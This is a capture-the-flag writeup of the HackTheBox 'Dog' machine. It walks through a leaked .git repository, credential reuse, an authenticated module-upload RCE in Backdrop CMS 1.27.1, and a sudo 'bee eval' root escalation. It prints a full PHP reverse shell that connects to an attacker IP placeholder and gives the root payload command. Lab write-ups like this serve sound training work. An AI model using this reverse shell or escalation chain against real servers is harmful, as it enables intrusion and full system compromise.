---
title: HackTheBox Dog Writeup
authors: Samarth
date: 2025-03-12 22:00:00 +0530
categories: [HackTheBox, Machines]
tags: [Linux, Apache, BackDrop CMS, RCE, Git Exposure]
math: true
mermaid: true
---

![Dog - HTB](/assets/images/writeups/Dog-HTB/banner.png)

## TL;DR

This writeup covers the [__Dog__](https://app.hackthebox.com/machines/Dog){:target="_blank"} machine, an easy-rated Linux box. Initial enumeration revealed open ports 22 (SSH) and 80 (Apache) hosting a Backdrop CMS website. Adding `dog.htb` to `/etc/hosts` enabled proper domain resolution. A `.git` directory was exposed on the web server, allowing me to dump and analyze the source code using `gitdumper`. Reviewing the extracted files, I found database credentials in `settings.php`, but they didn’t work for the login page. Further enumeration of `.git` revealed additional user emails, leading to successful login with `Tiffany`’s credentials. Backdrop CMS v1.27.1 was outdated and vulnerable to an authenticated RCE exploit, which I leveraged to gain a reverse shell as `www-data`. Enumerating the system, I found credentials for `johncusack`, allowing me to escalate to a user shell. Checking `sudo -l` revealed that `bee`, a Backdrop CLI utility, could be executed as root. Using its `eval` function, I executed arbitrary PHP commands to escalate privileges and gain a root shell, capturing the final flag.

## Scanning Network

I began by performing an Nmap scan, which revealed open ports 22 and 80, corresponding to OpenSSH, and Apache 2.4.41. Here are the results from the Nmap scan:

```bash
nmap -sC -sV -A -T4 -Pn 10.129.20.187 -oN scan/normal.scan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-10 08:38 IST
Nmap scan report for 10.129.20.187
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-git: 
|   10.129.20.187:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Home | Dog
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`Backdrop` CMS is hosted on `Apache 2.4.41`, running on port `80`.

## Enumeration

The Nmap scan revealed that the IP address was linked to the domain `dog.htb`. Therefore, I added this domain to the `"/etc/hosts"` file.

![Dog Website](/assets/images/writeups/Dog-HTB/1.png)

The website features a login page.

![Login page](/assets/images/writeups/Dog-HTB/2.png)

Before proceeding, I performed directory fuzzing to discover hidden files and directories on the website.

```javascript
 dirsearch -u http://dog.htb/ -x 403,400,404 -o dir.fuzz

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: dir.fuzz

Target: http://dog.htb/

[19:54:22] Starting: 
[19:54:33] 200 -   95B  - /.git/COMMIT_EDITMSG
[19:54:33] 200 -  405B  - /.git/branches/
[19:54:33] 200 -  601B  - /.git/
[19:54:33] 200 -   73B  - /.git/description
[19:54:33] 200 -   92B  - /.git/config
[19:54:33] 200 -   23B  - /.git/HEAD
[19:54:33] 200 -  648B  - /.git/hooks/
[19:54:33] 200 -  453B  - /.git/info/
[19:54:33] 200 -  240B  - /.git/info/exclude
[19:54:33] 200 -  473B  - /.git/logs/
[19:54:33] 200 -  230B  - /.git/logs/HEAD
[19:54:33] 301 -  311B  - /.git/logs/refs  ->  http://dog.htb/.git/logs/refs/
[19:54:33] 301 -  317B  - /.git/logs/refs/heads  ->  http://dog.htb/.git/logs/refs/heads/
[19:54:33] 200 -  230B  - /.git/logs/refs/heads/master
[19:54:33] 200 -  456B  - /.git/refs/
[19:54:33] 200 -   41B  - /.git/refs/heads/master
[19:54:33] 301 -  312B  - /.git/refs/heads  ->  http://dog.htb/.git/refs/heads/
[19:54:33] 301 -  301B  - /.git  ->  http://dog.htb/.git/
[19:54:33] 301 -  311B  - /.git/refs/tags  ->  http://dog.htb/.git/refs/tags/
[19:54:33] 200 -    2KB - /.git/objects/
[19:54:34] 200 -  337KB - /.git/index
[19:55:44] 301 -  301B  - /core  ->  http://dog.htb/core/
[19:55:57] 200 -  584B  - /files/
[19:55:57] 301 -  302B  - /files  ->  http://dog.htb/files/
[19:56:08] 200 -    4KB - /index.php
[19:56:12] 200 -  453B  - /layouts/
[19:56:13] 200 -    7KB - /LICENSE.txt
[19:56:23] 301 -  304B  - /modules  ->  http://dog.htb/modules/
[19:56:23] 200 -  400B  - /modules/
[19:56:41] 200 -    5KB - /README.md
[19:56:44] 200 -  528B  - /robots.txt
[19:56:47] 200 -    0B  - /settings.php
[19:56:50] 301 -  302B  - /sites  ->  http://dog.htb/sites/
[19:57:00] 200 -  451B  - /themes/
[19:57:00] 301 -  303B  - /themes  ->  http://dog.htb/themes/

Task Completed
```

During enumeration, I found an exposed `/.git` directory.

I used `gitdumper` to extract all accessible references and logs from `/.git`.

![Git Dumping](/assets/images/writeups/Dog-HTB/3.png)

After dumping the repository, I used the `extractor` tool to retrieve files from the `/.git` directory.

![Git Extractor](/assets/images/writeups/Dog-HTB/4.png)

After extracting the `/.git` directory, I analyzed the `.php` files. 

I found the `Backdrop` CMS configuration file, which revealed that it was running `v1.27.1`, an outdated release.

![BackDrop Version](/assets/images/writeups/Dog-HTB/5.png)

While exploring the directory, I found `settings.php`, which contained database credentials.

![Database Credentials](/assets/images/writeups/Dog-HTB/6.png)

Since I had database credentials and access to a login page, my first assumption was that the developer had reused the database password for authentication.

While browsing the website, I discovered some usernames.

![Users](/assets/images/writeups/Dog-HTB/7.png)

None of these usernames worked with the database password.

Since I had access to `/.git`, I searched for user emails using grep `@dog.htb`.

```bash
grep -R "@dog.htb" *
```

![Username enum in .git](/assets/images/writeups/Dog-HTB/8.png)

I found two more users as `root@dog.htb` and `tiffany@dog.htb`, so I decided to try for both using the database password.

## Exploitation

I successfully logged in as `Tiffany` using the database password.

![Admin Panel](/assets/images/writeups/Dog-HTB/9.png)

Next, I searched for vulnerabilities in the outdated `Backdrop` CMS version.

`BackDrop` CMS `v1.27.1` is vulnerable to [__`Authenticated Remote Code Execution (RCE)`__](https://www.exploit-db.com/exploits/52021){:target="_blank"}.

![Authenticated RCE on BackDrop v1.27.1](/assets/images/writeups/Dog-HTB/10.png)

`Backdrop CMS 1.27.1` has an **Authenticated Remote Command Execution (RCE) vulnerability** in its module upload feature, allowing attackers to upload a malicious ZIP archive. The exploit involves creating `shell.zip` containing `shell.info` (a dummy module descriptor) and `shell.php` (a backdoor). Once uploaded and extracted, the attacker accesses `shell.php` to execute arbitrary system commands. This can lead to full server compromise, allowing privilege escalation or data exfiltration. Mitigation includes updating Backdrop CMS, restricting module uploads, and validating file contents.

### Manual Exploitation

Every `Backdrop` CMS modules requires a `.info` file which contains metadata of the module and the `.php` file which contains PHP code of the functionality.

Let's look into an example `.info` file.

<b>Example block.info</b>
```ini
type = module
name = Block
description = Controls the visual building blocks a page is constructed with. Blocks are boxes of content rendered into an area, or region, of a web page.
package = Layouts
tags[] = Blocks
tags[] = Site Architecture
version = BACKDROP_VERSION
backdrop = 1.x

configure = admin/structure/block
; Added by Backdrop CMS packaging script on 2024-03-07
project = backdrop
version = 1.27.1
timestamp = 1709862662
```

`Backdrop CMS v1.27.1` does not properly validate the file content of a module during installation. Due to this insufficient validation, I can inject a PHP reverse shell into a `.php` file within the module's functionality.

Here's the reverse PHP shell in the `.php` file.

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = "<attacker's IP>";  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

Now, let's make `tar.gz` by including `.info` & `.php` file.

```bash
tar -cvzf shell.tar.gz shell/
```
## Exploitation via Exploit-DB exploit

I ran the exploit to generate a sample module ZIP file.

![Evil Module](/assets/images/writeups/Dog-HTB/11.png)

I extracted the ZIP file, and found `shell.info` and `shell.php` file. I replaced `shell.php` with a PHP reverse shell.

While browsing the install module option, I discovered that only certain file extensions were allowed.

![Module](/assets/images/writeups/Dog-HTB/12.png)

I have zipped the folder via tar.

```bash
tar -cvzf shell.tar.gz shell/
```

![Tar](/assets/images/writeups/Dog-HTB/13.png)

Next, I uploaded the module and opened a Netcat listener to trigger the reverse shell.

![Module uploaded](/assets/images/writeups/Dog-HTB/14.png)


![www-data shell](/assets/images/writeups/Dog-HTB/15.png)

While browsing, I came across two users: `jobert` and `johncusack`.

![Users](/assets/images/writeups/Dog-HTB/16.png)

The user flag was located under `johncusack`, so I tried using the database password for `johncusack`, and it worked.

![User Flag](/assets/images/writeups/Dog-HTB/17.png)

## Post Exploitation

Let's run `sudo -l` to check which list of commands that the current user can run with elevated privileges using `sudo`.

![sudo -l](/assets/images/writeups/Dog-HTB/18.png)

`Bee` is the command-line utility for BackDrop CMS. 

![Bee](/assets/images/writeups/Dog-HTB/19.png)

Let's craft the payload. The `--root` flag specifies the root directory for Backdrop CMS.

In my case the root directory path was `/var/www/html`.

<b>Initial Payload</b> - 

```bash
sudo /usr/local/bin/bee --root=/var/www/html
```

While exploring advanced options in `bee`, I discovered the `eval` flag, which allows arbitrary PHP execution.

![Bee's Advance](/assets/images/writeups/Dog-HTB/20.png)

I used the `eval` flag to execute a PHP command and gain a root shell.

<b>Final Payload</b> - 

```bash
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('/bin/sh');"
```

![Root user](/assets/images/writeups/Dog-HTB/21.png)

![Machine Pwned](/assets/images/writeups/Dog-HTB/Pwned.png)

Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.